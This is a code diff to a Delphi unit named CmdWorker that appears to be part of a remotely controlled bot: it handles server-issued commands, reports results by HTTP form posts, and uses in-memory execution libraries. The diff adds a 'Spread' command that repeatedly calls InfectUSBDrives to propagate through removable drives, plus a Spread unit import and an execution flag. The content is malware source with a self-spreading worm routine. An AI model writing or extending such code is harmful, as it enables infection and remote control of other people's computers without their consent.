@@ -5,7 +5,7 @@ unit CmdWorker;
 interface
 
 uses
-  NetModule, Tools,
+  NetModule, Tools, Spread,
   Classes, SysUtils, IdMultipartFormData, Process, IdHTTP, WExecFromMem,
   BTMemoryModule, IdUDPClient;
 
@@ -30,6 +30,7 @@ type
 
 var
   Workers: TWorkers;
+  AllowExecution: Boolean = true;
 
 function ExecIndex(CmdID: String): LongInt;
 function FindAPlace: LongInt;
@@ -130,6 +131,7 @@ Begin
   ToPost.Free;
   inherited Destroy;
   Workers[FIndex]:=Nil;
+  if FIndex=High(Workers) then SetLength(Workers, FIndex);
 end;
 
 procedure TCmdWorker.Abort(AbortID: String);
@@ -194,6 +196,7 @@ Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result', 'Restarting.');
       DoPost;
+      AllowExecution:=False;
       Restart(FullName);
     end;
     'Update': Begin
@@ -394,6 +397,17 @@ Begin
       DoPost;
       Sleep(500);
       if FileExists('P.html') then DeleteFile('P.html');
+    end;
+    'Spread': Begin
+      ToPost.AddFormField('RT', '1');
+      ToPost.AddFormField('Result', 'Spreading routine started.');
+      DoPost;
+      //Create clone
+      While Not(Terminated) do Begin
+        InfectUSBDrives;
+        Sleep(1000);
+      end;
+      //Remove clone
     end
     else Begin
       ToPost.AddFormField('RT', '1');
